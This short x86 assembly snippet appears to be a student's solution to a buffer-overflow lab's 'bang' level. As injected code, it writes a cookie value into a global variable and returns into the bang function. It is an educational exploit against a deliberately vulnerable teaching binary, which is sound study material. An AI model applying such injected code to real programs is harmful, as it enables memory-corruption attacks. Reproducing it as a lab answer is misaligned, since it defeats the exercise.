# push the address of bang onto stack
pushl $0x08048c9d
# in gdb, print &global_value  ==>   0x804d100
# mov cheukyin cookie to global_value
mov $0x3955ae84, %eax
mov %eax, 0x804d100
# jump to <bang>
ret